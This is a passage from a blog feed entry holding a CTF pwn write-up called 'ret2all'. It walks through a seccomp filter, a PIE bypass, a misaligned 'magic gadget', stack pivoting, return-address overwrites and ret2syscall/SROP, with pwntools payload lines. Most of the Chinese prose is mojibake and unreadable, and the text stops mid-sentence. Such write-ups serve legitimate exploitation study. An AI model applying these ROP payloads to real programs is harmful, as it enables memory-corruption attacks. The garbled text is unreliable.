      <link href="/2025/08/30/ret2all/"/>
      <url>/2025/08/30/ret2all/</url>
      
        <content type="html"><![CDATA[<blockquote><ul><li>è¯šå¦‚å‡ºé¢˜äººè¯„ä»·ã€Œ<strong><em>ä¸€ä»¶å®Œç¾çš„è‰ºæœ¯å“ï¼Œè‘¬ä¸‹äº†æ•´ä¸ªæ ˆæ—¶ä»£</em></strong>ã€</li><li>ç”¨åˆ°çš„æ‰€æœ‰æŠ€å·§éƒ½æ˜¯<strong>å…¥é—¨é˜¶æ®µåº”çŸ¥åº”ä¼šçš„æ ˆä¸ŠæŠ€å·§</strong>ï¼Œå®Œå…¨ä¸æ¶‰åŠæ›´é«˜é˜¶çš„æŠ€æ³•ã€‚</li><li>æœ¬é¢˜å‡ ä¹å·²ç»æŠŠæ ˆä¸Šå¯ç”¨çš„æŠ€å·§ç©·å°½ï¼Œäºæ˜¯ç¬”è€…æ‹¿æ¥ä½œä¸ºå¤å¥ç»ƒä¹ </li><li>å¤ç°å®Œç¬”è€…å·²ç»çŒªè„‘è¿‡è½½äº†ï¼Œå°½å¯èƒ½åœ¨åŸºäºå‡ºé¢˜äººçš„æ€ç»´ä¸Šï¼Œä¹Ÿé˜è¿°äº†ç¬”è€…â€<em>è¿™é‡Œä¸ºä»€ä¹ˆè¦è¿™æ ·åš</em>â€œçš„æ€è€ƒ</li></ul></blockquote><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p>é™¤canaryå…¶ä½™ä¿æŠ¤å…¨å¼€</p><p><img src="/2025/08/30/ret2all/Pasted image 20250822174322-1756551625879-1.png" alt="Pasted image 20250822174322" style="zoom:50%;"></p><h3 id="initå‡½æ•°"><a href="#initå‡½æ•°" class="headerlink" title="initå‡½æ•°"></a>initå‡½æ•°</h3><p><img src="/2025/08/30/ret2all/Pasted image 20250828180156.png" alt="Pasted image 20250828180156" style="zoom:50%;"></p><p>è®¾ç½®ç¼“å†²åŒºï¼Œç„¶åå°†rreadå‡½æ•°çš„rbpå’Œretæ•°å€¼å­˜å‚¨åˆ°äº†bssæ®µï¼Œå†è¾“å‡ºå‡ºæ¥ï¼Œæœ€åmprotectå°†bssæ®µæƒé™æ”¹ä¸ºåªè¯»é˜²æ­¢æ›´æ”¹</p><h3 id="seccomp"><a href="#seccomp" class="headerlink" title="seccomp"></a>seccomp</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x27 0xc000003e  if (A != ARCH_X86_64) goto 0041</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x24 0xffffffff  if (A != 0xffffffff) goto 0041</span><br><span class="line"> 0005: 0x15 0x23 0x00 0x00000005  if (A == fstat) goto 0041</span><br><span class="line"> 0006: 0x15 0x22 0x00 0x00000009  if (A == mmap) goto 0041</span><br><span class="line"> 0007: 0x15 0x21 0x00 0x0000000a  if (A == mprotect) goto 0041</span><br><span class="line"> 0008: 0x15 0x20 0x00 0x00000011  if (A == pread64) goto 0041</span><br><span class="line"> 0009: 0x15 0x1f 0x00 0x00000012  if (A == pwrite64) goto 0041</span><br><span class="line"> 0010: 0x15 0x1e 0x00 0x00000013  if (A == readv) goto 0041</span><br><span class="line"> 0011: 0x15 0x1d 0x00 0x00000014  if (A == writev) goto 0041</span><br><span class="line"> 0012: 0x15 0x1c 0x00 0x00000028  if (A == sendfile) goto 0041</span><br><span class="line"> 0013: 0x15 0x1b 0x00 0x00000029  if (A == socket) goto 0041</span><br><span class="line"> 0014: 0x15 0x1a 0x00 0x0000002a  if (A == connect) goto 0041</span><br><span class="line"> 0015: 0x15 0x19 0x00 0x0000002c  if (A == sendto) goto 0041</span><br><span class="line"> 0016: 0x15 0x18 0x00 0x0000002e  if (A == sendmsg) goto 0041</span><br><span class="line"> 0017: 0x15 0x17 0x00 0x00000031  if (A == bind) goto 0041</span><br><span class="line"> 0018: 0x15 0x16 0x00 0x00000032  if (A == listen) goto 0041</span><br><span class="line"> 0019: 0x15 0x15 0x00 0x00000038  if (A == clone) goto 0041</span><br><span class="line"> 0020: 0x15 0x14 0x00 0x00000039  if (A == fork) goto 0041</span><br><span class="line"> 0021: 0x15 0x13 0x00 0x0000003b  if (A == execve) goto 0041</span><br><span class="line"> 0022: 0x15 0x12 0x00 0x00000127  if (A == preadv) goto 0041</span><br><span class="line"> 0023: 0x15 0x11 0x00 0x00000128  if (A == pwritev) goto 0041</span><br><span class="line"> 0024: 0x15 0x10 0x00 0x0000012f  if (A == name_to_handle_at) goto 0041</span><br><span class="line"> 0025: 0x15 0x0f 0x00 0x00000130  if (A == open_by_handle_at) goto 0041</span><br><span class="line"> 0026: 0x15 0x0e 0x00 0x00000142  if (A == execveat) goto 0041</span><br><span class="line"> 0027: 0x15 0x0d 0x00 0x00000147  if (A == preadv2) goto 0041</span><br><span class="line"> 0028: 0x15 0x0c 0x00 0x00000148  if (A == pwritev2) goto 0041</span><br><span class="line">**********************</span><br><span class="line"> 0029: 0x15 0x00 0x04 0x00000001  if (A != write) goto 0034</span><br><span class="line"> 0030: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # write(fd, buf, count)</span><br><span class="line"> 0031: 0x15 0x00 0x09 0x00000000  if (A != 0x0) goto 0041</span><br><span class="line"> 0032: 0x20 0x00 0x00 0x00000010  A = fd # write(fd, buf, count)</span><br><span class="line"> 0033: 0x15 0x06 0x07 0x00000002  if (A == 0x2) goto 0040 else goto 0041</span><br><span class="line"> *********************</span><br><span class="line"> 0034: 0x15 0x00 0x05 0x00000000  if (A != read) goto 0040</span><br><span class="line"> 0035: 0x20 0x00 0x00 0x00000014  A = fd &gt;&gt; 32 # read(fd, buf, count)</span><br><span class="line"> 0036: 0x25 0x04 0x00 0x00000000  if (A &gt; 0x0) goto 0041</span><br><span class="line"> 0037: 0x15 0x00 0x02 0x00000000  if (A != 0x0) goto 0040</span><br><span class="line"> 0038: 0x20 0x00 0x00 0x00000010  A = fd # read(fd, buf, count)</span><br><span class="line"> 0039: 0x35 0x01 0x00 0x00000001  if (A &gt;= 0x1) goto 0041</span><br><span class="line"> *********************</span><br><span class="line"> 0040: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0041: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>ç¦ç”¨äº†å¤§å¤šæ•°å±é™©çš„syscallï¼ŒåŒ…æ‹¬readã€writeçš„åˆ†æ”¯ï¼Œä½†æ˜¯ä¿ç•™äº†å­˜åœ¨é™åˆ¶çš„æœ¬ä½“<br><strong>å…è®¸çš„ syscall</strong>ï¼š</p><ul><li><code>read(0, buf, â€¦)</code>ï¼Œåªèƒ½ä»æ ‡å‡†è¾“å…¥è¯»æ•°æ®</li><li><code>write(2, buf, â€¦)</code>ï¼Œæ‰“å°åˆ°é”™è¯¯æ ‡å‡†</li><li><code>open</code>æ­£å¸¸</li></ul><p>åº”å¯¹readåªèƒ½0</p><blockquote><p>Linux åˆ†é… fd æ—¶ä¼šé€‰æ‹©å½“å‰æœ€å°å¯ç”¨çš„ fd â†’ å¦‚æœæ”»å‡»è€…åœ¨ <code>close(0)</code> åå† <code>open(&quot;xxx&quot;)</code>ï¼Œæ–°çš„æ–‡ä»¶å°±ä¼šå ç”¨ fd=0ã€‚é‚£ä¹ˆå†è°ƒç”¨ <code>read(0, â€¦)</code> å°±å˜æˆä»è¿™ä¸ªæ–°æ–‡ä»¶é‡Œè¯»æ•°æ®äº†ã€‚</p></blockquote><p>åº”å¯¹writeåªèƒ½2</p><blockquote><p><code>dup2(oldfd, newfd)</code> æ˜¯ä¸€ä¸ª Linux ç³»ç»Ÿè°ƒç”¨ï¼Œç”¨æ¥æŠŠ <strong>æ–‡ä»¶æè¿°ç¬¦</strong> é‡å®šå‘ã€‚<br><code>dup2(1, 2)</code><br><code>1</code> = <strong>æ ‡å‡†è¾“å‡º stdout</strong><br><code>2</code> = <strong>æ ‡å‡†é”™è¯¯ stderr</strong><br>è°ƒç”¨åæ•ˆæœæ˜¯ï¼šæ‰€æœ‰å†™åˆ° <strong>stderr (fd=2)</strong> çš„å†…å®¹ï¼Œå…¶å®éƒ½ä¼šæµå‘ <strong>stdout (fd=1)</strong>ã€‚</p></blockquote><h3 id="é™æ€åˆ†æ"><a href="#é™æ€åˆ†æ" class="headerlink" title="é™æ€åˆ†æ"></a>é™æ€åˆ†æ</h3><p>å¯¹ IDA åç¼–è¯‘ç»“æœè¿›è¡Œé‡å‘½åç­‰ä¼˜åŒ–</p><p><img src="/2025/08/30/ret2all/Pasted image 20250828183721.png" alt="Pasted image 20250828183721" style="zoom:50%;"><img src="/2025/08/30/ret2all/Pasted image 20250828183901.png" alt="Pasted image 20250828183901" style="zoom:50%;"></p><p>æ ¹æ®å¼€å¤´é€çš„åœ°å€æˆ‘ä»¬å¯ä»¥è®¡ç®—å‡º<code>elfbase=:0x555555555871- 0x555555554000=0x1871</code>ï¼Œå¯ä»¥ç»•è¿‡PIE</p><h2 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h2><h3 id="â‘ ret2text"><a href="#â‘ ret2text" class="headerlink" title="â‘ ret2text"></a>â‘ ret2text</h3><p><img src="/2025/08/30/ret2all/Pasted image 20250828193445.png" alt="Pasted image 20250828193445"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">read1 = elfbase + <span class="number">0x182F</span> <span class="comment">#æ§åˆ¶rbpä»è€Œæ§åˆ¶rsi,å³readå‡½æ•°çš„å‚æ•°bufï¼Œæ§åˆ¶readè¦è¯»åˆ°å“ªé‡Œ</span></span><br><span class="line">read2 = elfbase + <span class="number">0x1840</span> <span class="comment">#call _readå¼€å§‹ï¼Œé€‚åˆåé¢å·²ç»æ§åˆ¶å¥½äº†rsiå’Œrdxå‚æ•°ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨</span></span><br><span class="line">read3 = elfbase + <span class="number">0x183B</span> <span class="comment">#åé¢è°ƒç”¨writeåæ–¹ä¾¿è½¬è°ƒç”¨read</span></span><br></pre></td></tr></table></figure><h3 id="â‘¡magic-gadget"><a href="#â‘¡magic-gadget" class="headerlink" title="â‘¡magic gadget"></a>â‘¡magic gadget</h3><p>magic gadgeté¡¾åæ€ä¹‰å°±æ˜¯ä¸€äº›æ¯”è¾ƒç¥å¥‡å¥½ç”¨gadgetï¼Œä¸ºä»€ä¹ˆ<code>add_rbp_3d_ebx = elfbase + 0x1252</code>è¿™ä¸ªåœ°å€çš„gadgetç¥å¥‡å‘¢ï¼Ÿ<br>ä¸€èˆ¬ç¨‹åºéƒ½ä¼šæœ‰__do_global_dtors_auxè¿™ä¸ªå‡½æ•°ï¼Œ</p><p><img src="/2025/08/30/ret2all/Pasted image 20250828190810.png" alt="Pasted image 20250828190810"></p><p>è€Œå°†<code>mov cs:completed_0, 1</code>æŒ‡ä»¤çš„æœ€åä¸€ä½<code>01</code>æ‹†å¼€ä¸ä¸‹é¢çš„<code>pop rbp; ret</code>ç»„åˆï¼Œå°±æ˜¯<code>01 5D C3</code>ï¼Œæ„æ€æ˜¯<code>add dword ptr [rbp - 0x3d], ebx</code>ï¼Œå†åŠ ä¸Šåé¢çš„æŒ‡ä»¤ï¼Œ<code>elfbase + 0x1252</code>çš„æŒ‡ä»¤å°±æ˜¯<code>add dword ptr [rbp - 0x3d], ebx; nop dword ptr [rax]; ret</code><br><img src="/2025/08/30/ret2all/Pasted image 20250828191142.png" alt="Pasted image 20250828191142"></p><p>å…ˆæ§åˆ¶ebxï¼Œå°±å¯ä»¥å°†<code>rbp - 0x3d</code>å¤„çš„å€¼åŠ ä¸Šebxçš„å€¼ï¼Œæ˜¯æœ¬æ–‡åé¢æ§åˆ¶libcåç§»çš„æ–¹æ³•</p><h3 id="â‘¢æ ˆè¿ç§»"><a href="#â‘¢æ ˆè¿ç§»" class="headerlink" title="â‘¢æ ˆè¿ç§»"></a>â‘¢æ ˆè¿ç§»</h3><h4 id="åŸæ‰§è¡Œæµç¨‹"><a href="#åŸæ‰§è¡Œæµç¨‹" class="headerlink" title="åŸæ‰§è¡Œæµç¨‹"></a>åŸæ‰§è¡Œæµç¨‹</h4><p><img src="/2025/08/30/ret2all/Pasted image 20250829155614.png" alt="Pasted image 20250829155614"></p><p><strong>æ€è€ƒ</strong></p><blockquote><p>æ­£å¸¸æ‰§è¡Œå®Œç¬¬2æ¬¡<code>leaveï¼›ret</code>ï¼Œeip-&gt;<code>0x55555555589b</code>,rsp-&gt;<code>0x7fffffffda0</code>ï¼Œrbp-&gt;<code>0x7fffffffdab0</code>ï¼ˆå³åœ°å€<code>0x7fffffffda90</code>å¤„çš„å€¼ï¼Œå¦‚æœç”¨<code>x</code>æ¥è¡¨ç¤ºè¿™ä¸ªå€¼ï¼Œæ­¤æ—¶rbp-&gt;<code>x</code>ï¼Œæ°å¥½å¯ä»¥æº¢å‡ºåˆ°è¿™ä¸ªå€¼ï¼‰</p><p>ä¸‹ä¸€æ­¥ï¼ˆå³ç¬¬3æ¬¡ï¼‰<code>leave;ret</code>å°†ä½¿rsp-&gt;<code>x+0x10</code>,rbp-&gt;<code>[x]</code>,eip-&gt;<code>[x+0x8]</code>,è‹¥é€šè¿‡æº¢å‡ºå°†åœ°å€<code>0x7fffffffda90</code>å¤„çš„å€¼<code>x</code>æ”¹ä¸º<code>need_address-0x8</code>ï¼Œå³å¯æ§åˆ¶ç¨‹åºæµä½¿å…¶æ‰§è¡Œ<code>[need_address]</code>çš„æŒ‡ä»¤(æˆ‘ä»¬å¯ä»¥åœ¨æ ˆä¸­æ’å…¥è¿™ä¸ªæŒ‡ä»¤çš„åœ°å€)ï¼ŒåŒæ—¶rbpçš„å€¼å˜ä¸ºåœ°å€<code>x</code>å¤„çš„å€¼ï¼Œå¦‚æœæˆ‘ä»¬å¯ä»¥æ§åˆ¶åœ°å€<code>x</code>å¤„çš„å€¼å°±å†å¥½ä¸è¿‡äº†</p></blockquote><h4 id="æ§åˆ¶åæ‰§è¡Œæµç¨‹"><a href="#æ§åˆ¶åæ‰§è¡Œæµç¨‹" class="headerlink" title="æ§åˆ¶åæ‰§è¡Œæµç¨‹"></a>æ§åˆ¶åæ‰§è¡Œæµç¨‹</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(check_word*<span class="number">4</span>  + p64(RBP) + p64(RET) + p64(RBP-<span class="number">0x10</span>) + p64(read) + p64(RBP+<span class="number">0x10</span>))</span><br></pre></td></tr></table></figure><p><img src="/2025/08/30/ret2all/Pasted image 20250829150106.png" alt="Pasted image 20250829150106"></p><blockquote><p>ç»¿æ¡†æ ‡å‡ºçš„ä¸ºå›ºå®šå€¼ï¼Œçº¢æ¡†æ ‡å‡ºçš„ä¸ºå¯æ§çš„0x18å­—èŠ‚<br>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬æœ€åå¯ä»¥æ§åˆ¶åˆ°vulnå‡½æ•°çš„rbpï¼Œèƒ½æ§åˆ¶rbpï¼Œå°±èƒ½æ§åˆ¶ç¨‹åºæµ</p></blockquote><p>åœ¨è¾“å…¥å®Œä¼šç»å†3æ¬¡<code>leaveï¼›ret</code>,å‰ä¸¤æ¬¡rbpå›ºå®šï¼Œåˆ†åˆ«æ˜¯<code>0x7fffffffda70</code>ï¼Œ<code>0x7fffffffda90</code>ï¼Œ<code>leave</code>ç›¸å½“äº<code>mov rsp,rbp;pop rbp</code></p><p><img src="/2025/08/30/ret2all/Pasted image 20250829150140.png" alt="Pasted image 20250829150140">å‚è€ƒä¸Šå›¾</p><ul><li>ç¬¬1æ¬¡,<code>0x555555555852</code>å¤„ï¼šå…ˆmovï¼Œrspçš„å€¼å˜ä¸º<code>0x7fffffffda70</code>,popå°†rbpçš„å€¼å˜ä¸º<code>0x7fffffffda90</code>,åŒæ—¶popä¹‹årspçš„å€¼ä¼š+8ï¼Œåˆ°<code>0x7fffffffda78</code>ï¼Œéšåretï¼Œeipå˜ä¸º<code>0x555555555871</code>ï¼Œretä¹‹årspçš„å€¼å†+8ï¼Œå˜ä¸º<code>0x7fffffffda80</code>ï¼Œå®Œæˆä¸€ä¸ªå®Œæ•´çš„æ ˆè¿ç§»å‘¨æœŸ</li><li>ç¬¬2æ¬¡,<code>0x555555555872</code>å¤„ï¼šå…ˆmovï¼Œrsp-&gt;<code>0x7fffffffda90</code>;pop,rbp-&gt;<code>0x7fffffffda80</code>(æˆ‘ä»¬è‡ªå·±è¾“å…¥çš„å€¼),rsp-&gt;<code>0x7fffffffda98</code>;ret,eip-&gt;<code>0x55555555589b</code>,rsp-&gt;<code>0x7fffffffda0</code></li><li>ç¬¬3æ¬¡,<code>0x55555555589c</code>å¤„ï¼šå…ˆmovï¼Œrsp-&gt;<code>0x7fffffffda80</code>;pop,rbp-&gt;<code>0x7fffffffdaa0</code>,rsp-&gt;<code>0x7fffffffda88</code>;ret,eip-&gt;<code>0x55555555582f(rread+12)</code>,rsp-&gt;<code>0x7fffffffd90</code></li></ul><hr><p>ï¼ç”±äº<strong>ASLR</strong>ï¼Œä»æ­¤å¼€å§‹ åœ°å€ ä¼šå‘ç”Ÿå˜åŒ–ï¼Œrbpå˜ä¸º<code>0x7fffffffdb10</code></p><hr><p><img src="/2025/08/30/ret2all/Pasted image 20250830120758.png" alt="Pasted image 20250830120758"></p><p>å°†ä¼šæ‰§è¡Œ<code>read(0, 0x7fffffffdac0, 0x88)</code></p><h3 id="â‘£æ ˆè¿”å›"><a href="#â‘£æ ˆè¿”å›" class="headerlink" title="â‘£æ ˆè¿”å›"></a>â‘£æ ˆè¿”å›</h3><blockquote><p>æ ˆè¿”å›å°±æ˜¯é€šè¿‡glibcå‡½æ•°åœ¨æ ˆä¸Šä¿®æ”¹è‡ªå·±çš„è¿”å›åœ°å€ï¼Œæ˜¯ä¸€ç§æ›´åŠ éšè”½çš„æ ˆæº¢å‡ºï¼Œå› ä¸ºglibcå‡½æ•°åœ¨ç¨‹åºä¸­é€šå¸¸çœ‹ä¸è§æµç¨‹ã€‚å¸¸è§äºreadï¼Œprintf</p><p>åœ¨callä¸€ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œå‡½æ•°ä¼š<code>push è¿”å›åœ°å€</code>ï¼Œç”±äºæ˜¯pushï¼Œrspä¼šå‡8ï¼Œæ¥ç€ä¸Šé¢çš„ä¾‹å­ï¼Œcalläº†readåï¼Œrspä¼šå˜ä¸º<code>0x7fffffffdb08</code>ï¼Œéšååœ¨readå‡½æ•°ä¸­ï¼Œreadçš„åŠŸèƒ½æ‰§è¡Œå®Œæ¯•åï¼Œæœ€åä¼šåƒå¾ˆå¤šå‡½æ•°ä¸€æ ·æ‰§è¡Œ<code>leave; ret</code>ï¼Œå°±ä¼šretå›<code>0x7fffffffdb08</code>å­˜æ”¾çš„<strong>è¿”å›åœ°å€</strong></p><p>å›¾ä¸ºåŸæ‰§è¡Œè¿‡ç¨‹ï¼Œå°†å›åˆ°rreadå¹¶å°†è¦æ‰§è¡Œ<strong>shadowæ£€æµ‹</strong></p><p><img src="/2025/08/30/ret2all/Pasted image 20250830123641.png" alt="Pasted image 20250830123641" style="zoom:50%;"></p><p>å¦‚æœèƒ½åœ¨readå‡½æ•°è¿”å›ä¹‹å‰<strong>ä¿®æ”¹è¿™ä¸ªè¿”å›åœ°å€</strong>ï¼Œå°±å¯ä»¥æ§åˆ¶ç¨‹åºæµã€‚è¿™æ˜¯æœ¬æ–‡èº²é¿shadowæ£€æµ‹çš„ä¸»è¦æ–¹æ³•<img src="/2025/08/30/ret2all/Pasted image 20250830123753.png" alt="Pasted image 20250830123753" style="zoom:67%;"><br>ç»¿æ¡†ä¸ºå¯è¯»å…¥éƒ¨åˆ†</p></blockquote><h3 id="â‘¤ret2syscall"><a href="#â‘¤ret2syscall" class="headerlink" title="â‘¤ret2syscall"></a>â‘¤ret2syscall</h3><blockquote><ul><li>ret2syscallçš„æ„æ€å°±æ˜¯è¿”å›åˆ°syscallä¸Šï¼Œä¸€èˆ¬çš„é¢˜ç›®è€ƒè¿™ä¸ªä¼šåœ¨ç¨‹åºçš„textæ®µä½¿ç”¨syscallï¼Œç•™ä¸€äº›åé—¨syscallè¿™ç§ï¼Œå…¶å®è¿™ç§å¯ä»¥å½’ç±»ä¸ºret2textï¼Œä¸èƒ½ç®—ret2syscallã€‚</li><li>æœ¬é¢˜çš„textæ®µæ²¡æœ‰syscallï¼Œé‚£æœ‰syscallå¹¶ä¸”æœ‰æœºä¼šè°ƒç”¨çš„åœ°æ–¹å°±æ˜¯libcï¼Œvsyscallæ®µè™½ç„¶æœ‰syscallï¼Œä½†æ˜¯å†…æ ¸ä¼šæ£€æµ‹ï¼Œä¸èƒ½ç”¨ã€‚</li><li>è°ƒç”¨libcé‡Œçš„syscallä¸€èˆ¬å¯ä»¥å½’ç±»ä¸ºret2libcï¼Œä¸èƒ½ç®—ret2syscallï¼Œä½†æ˜¯ret2libcä¸€èˆ¬è¦èƒ½å®Œå…¨retåˆ°libcçš„æ‰€æœ‰åœ°å€æ‰ç®—ï¼Œè¿™é‡Œä¸èƒ½å®Œå…¨retï¼Œåªèƒ½å•ç‹¬retåˆ°syscallè¿™ä¸ªæœ‰æ•ˆå­—æ®µï¼Œæ‰€ä»¥è¿™é¢˜ç®—æ˜¯çœŸæ­£çš„ret2syscall <img src="/2025/08/30/ret2all/Pasted image 20250830121600.png" alt="Pasted image 20250830121600" style="zoom:50%;"></li></ul></blockquote><p>æ ˆä¸Šæœ‰è¿™ä¸¤ä¸ªç»å¸¸ç”¨çš„libcåœ°å€ï¼Œç”±äºæ— çˆ†ç ´ï¼Œæ‰€ä»¥å°è¯•çœ‹çœ‹è¿™ä¸¤ä¸ªåœ°å€é™„è¿‘æœ‰æ²¡æœ‰syscall</p><p><img src="/2025/08/30/ret2all/Pasted image 20250830121640.png" alt="Pasted image 20250830121640" style="zoom:50%;"></p><p>æˆåŠŸæ‰¾åˆ°ä¸€ä¸ªé‡ç”Ÿçš„syscallï¼Œåªéœ€readæ—¶ä¿®æ”¹æœ€åä¸€ä¸ªå­—èŠ‚å³å¯ä½¿æ ˆä¸Šæœ‰syscall</p><blockquote><p><strong>æš‚æ—¶çœ‹ä¸æ‡‚çš„ï¼Œå‡ºé¢˜äººçš„è¯ï¼š</strong><br>ä½†æ˜¯è¿™ä¸ªsyscallæœ‰å¾ˆå¤§å¼Šç«¯ï¼Œå› ä¸ºSROPéœ€è¦è¿ç»­è°ƒç”¨ä¸¤æ¬¡syscallï¼Œè°ƒç”¨å®Œsigreturnåï¼Œå†æ¥åˆ°è¿™é‡Œè°ƒç”¨dup2(1, 2)ç»“æŸï¼Œä¼šjmpå›ä¸Šæ–¹ï¼Œè¿›å…¥ä¸€ä¸ªsyscallçš„å¾ªç¯ã€‚å¦‚æœç¨‹åºä¸­æœ‰<code>ret 8</code>è¿™ä¸ªgadgetï¼Œæˆ–è€…retçš„æ•°å€¼æ¯”è¾ƒå¥½çš„ï¼ˆ8çš„æ•´æ•°å€ï¼‰ï¼Œå¯ä»¥é€šè¿‡æ§åˆ¶edxä¸º15ï¼Œè°ƒç”¨dup2(1, 2)å®Œåå†æ¬¡è°ƒç”¨sigreturnï¼Œæå‰åœ¨æ ˆä¸Šæ„é€ å¥½ï¼Œå°±å¯ä»¥å®ç°ä¸€ä¸ªSROPçš„â€œåŒè½¦é”™â€ï¼Œå¯ä»¥è·³å‡ºè¿™ä¸ªå¾ªç¯ã€‚ä½†æ˜¯è¿™ä¸ªç¨‹åºä¸­åªæœ‰<code>ret 0x2d</code>ï¼Œè¿™ä¸ªå€¼ä¸å¥½ï¼Œä¼šå¡å­—æ®µï¼ˆ<strong>é€‰ä¿®ï¼Œæ„Ÿå…´è¶£å¯è‡ªè¡Œå°è¯•</strong>ï¼‰<br>æ‰€ä»¥åé¢è¿˜è¦æ‰¾å¦ä¸€ä¸ªsyscallï¼Œå…ˆç”¨è¿™ä¸ªè°ƒç”¨sigreturnï¼Œæ§åˆ¶rbxå­—æ®µï¼Œç„¶ååˆ©ç”¨magic gadgetå°†è¿™ä¸ªsyscallæ”¹æˆæ›´å¥½çš„syscallï¼Œä¾‹å¦‚<code>syscall; ret</code></p></blockquote><h3 id="â‘¥æ ˆé£æ°´"><a href="#â‘¥æ ˆé£æ°´" class="headerlink" title="â‘¥æ ˆé£æ°´"></a>â‘¥æ ˆé£æ°´</h3><blockquote><p>æ ˆé£æ°´å°±æ˜¯åœ¨æ ˆä¸Šæå‰è¿›è¡Œä¸€äº›å¸ƒå±€ï¼Œæ–¹ä¾¿åç»­çš„ROPã€‚è¿™ä¸ªé€šå¸¸æ˜¯åšåˆ°åé¢å‘ç°åšå¾—æœ‰äº›è´¹åŠ²ï¼Œå°±ä¼šæƒ³åœ¨å‰é¢æå‰å¸ƒå±€ï¼Œæ­¤å¤„è®²è§£ä¸ºä»€ä¹ˆè¿™ä¹ˆç•™æ˜¯å¾ˆå›°éš¾çš„ï¼Œåˆ°åé¢æ‰èƒ½çŸ¥é“<br>è¿™é‡Œè“çº¿æ¡†ä½çš„å°±æ˜¯æ ˆé£æ°´ï¼Œæš‚æ—¶æ— ç”¨ï¼Œåšåˆ°åé¢çš„æ—¶å€™å‘ç°shadowæ£€æµ‹ä¼šå›åˆ°è¿™é‡Œï¼Œæ§åˆ¶è¿™é‡Œçš„å€¼ï¼Œåæ–‡è¿›è¡Œè§£é‡Š<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">7</span> + p64(RBP + <span class="number">0xf0</span>) + p64(read) + p64(leave) + p64(RBP + <span class="number">0x100</span>) + p64(leave) + p64(RBP - <span class="number">0x18</span>) + p64(leave) + p64(<span class="number">0</span>) + p8(<span class="number">0xec</span>)</span><br><span class="line"><span class="comment">#0x7fffffffdaf8 -&gt; 0x7fffffffdc00   p64(RBP + 0xf0)</span></span><br><span class="line"><span class="comment">#0x7fffffffdb00 -&gt; p64(read)</span></span><br><span class="line"><span class="comment">#0x7fffffffdb08 -&gt; p64(leave) åŸå€¼ä¸ºreadçš„è¿”å›åœ°å€</span></span><br><span class="line"><span class="comment">#==============================================================       </span></span><br><span class="line"><span class="comment">#0x7fffffffdb10 -&gt; 0x7fffffffdc10   p64(RBP + 0x100)</span></span><br><span class="line"><span class="comment">#0x7fffffffdb18 -&gt; p64(leave) æ ˆé£æ°´ï¼Œåé¢ç¨‹åºæµä¼šæ— å¯é¿å…çš„è½¬å‘è¿™é‡Œï¼Œæå‰å¸ƒå±€</span></span><br><span class="line"><span class="comment">#==============================================================       </span></span><br><span class="line"><span class="comment">#0x7fffffffdaa0 -&gt; 0x7fffffffda78   p64(RBP - 0x18)</span></span><br><span class="line"><span class="comment">#0x7fffffffdaa8 -&gt; p64(leave)</span></span><br><span class="line"><span class="comment">#0x7fffffffdab0 -&gt; 0</span></span><br><span class="line"><span class="comment">#0x7fffffffdab8 -&gt; 0x7ffff7c2a1e   syscall</span></span><br></pre></td></tr></table></figure><br><img src="/2025/08/30/ret2all/Pasted image 20250830123033.png" alt="Pasted image 20250830123033" style="zoom:50%;"></p></blockquote><p>å¼€å§‹çš„0x38å­—èŠ‚ç”¨0å¡«å……<br>ä¹‹åçš„0x10å­˜æ”¾çš„æ˜¯<code>rbpè®¾ç½®ä¸ºå¤šå°‘</code>ï¼Œ<code>retåˆ°å“ª</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªç»„åˆï¼Œç”¨äºæ¥æ”¶<code>leave; ret</code>ï¼Œä»¥ä¸‹ç®€ç§°<code>leaveç»„åˆ</code>ã€‚</p><ul><li><p>å½“æ§åˆ¶rbpçš„å€¼<code>0x7fffffffdaf8</code>æ—¶ï¼Œæ‰§è¡Œ<code>leave; ret</code>åï¼Œå…ˆæ˜¯<code>0x7fffffffdc00</code>è¢«rbpæ‹¿ï¼Œç„¶åretåˆ°read</p></li><li><p>ä¸­é—´çš„<code>0x8</code>å­—èŠ‚æ˜¯ropèµ·ç‚¹</p><ol><li>readå‡½æ•°ç»“æŸretå›æ¥ï¼Œåˆ°ropèµ·ç‚¹çš„leaveç»„åˆã€‚æ­¤æ—¶rbpçš„å­˜çš„å€¼æ˜¯<code>0x7fffffffdaf8</code><img src="/2025/08/30/ret2all/Pasted image 20250830133028.png" alt="Pasted image 20250830133028" style="zoom:50%;"></li><li>æ‰§è¡Œç¬¬1ä¸ª<code>leaveç»„åˆ</code>,å°†è¦æ‰§è¡Œç¬¬1ä¸ª<code>leaveç»„åˆ</code><img src="/2025/08/30/ret2all/Pasted image 20250830133647.png" alt="Pasted image 20250830133647" style="zoom:50%;"></li><li>æ‰§è¡Œç¬¬2ä¸ª<code>leaveç»„åˆ</code>,å°†è¦æ‰§è¡Œ<code>read</code><img src="/2025/08/30/ret2all/Pasted image 20250830133800.png" alt="Pasted image 20250830133800" style="zoom:50%;"></li></ol></li><li><p>ä¸ºä»€ä¹ˆä¸ç›´æ¥è·³åˆ°ä¸Šé¢ï¼Œè€Œæ˜¯è¦å…ˆå»ä¸‹é¢å†åˆ°ä¸Šé¢ï¼šå¯ä»¥æ§rbpåˆ°ä¸Šé¢ï¼Œè¿™æ 